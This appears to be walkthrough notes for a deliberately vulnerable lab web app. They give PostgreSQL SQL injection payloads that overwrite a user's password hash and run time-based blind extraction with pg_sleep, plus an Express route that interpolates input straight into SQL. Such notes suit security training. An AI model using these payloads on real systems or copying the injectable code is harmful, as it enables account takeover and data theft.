 

## SQL Injection Steps

* Bypass login function with sql injection
 - The following can be used to guess a password, but you can change the query accordingly
 ```
 /login password field, replaces your hash!
 test'; INSERT INTO users (username,password) VALUES ('test', '$2y$10$x6PXZnQoodybWH/kmtwEQeKf7PasRSGvb7zaEQ.y0xGFrbntiUqpW') ON CONFLICT (username) DO UPDATE SET password='$2y$10$x6PXZnQoodybWH/kmtwEQeKf7PasRSGvb7zaEQ.y0xGFrbntiUqpW';--
 ```
 - Possible variation assuming we DON'T know the name of the password field.
```
test'; SELECT CASE WHEN ((SELECT password from users where username='admin'))='admin1' THEN (select pg_sleep(5)) ELSE NULL END;--
``` 

* Try a blind scenario to get the DB name
- If your database name is "postgres" this will work otherwise use something like intruder to build out the query and dump the db name based on time responses

```
/register username field
johnny','test'); SELECT CASE WHEN (SUBSTR((SELECT current_database()),1,1))='a' THEN (select pg_sleep(3)) ELSE NULL END;--
```
 - Read Jakes blog about safe sql injection!

* Set up a reflected scenario that will print SQL results to you in the UI and get info from it

```
/forgot
router.post('/forgot', async function(req, res, next) {
  console.log(`SELECT * from users where username='${req.body.username}';`);
  var db_response = await client.query(`SELECT * from users where username='${req.body.username}';`);
  console.log(db_response);
  var username_return = '';
  db_response.rows.forEach(element => username_return+=element.username);
  res.render('forgot_valid',{user:username_return});
});
```
Try and send a password reset for username `' OR '1'='1`


 SELECT current_database()

 test'; SELECT CASE WHEN ((SELECT password from users where username='admin'))='admin1' THEN (select pg_sleep(5)) ELSE NULL END;--

 ## Cookie vulns

 * Current cookie creation does not implement sufficient entropy, thus the cookies are brute forceable 
 * No current methods for session destruction client/serverside 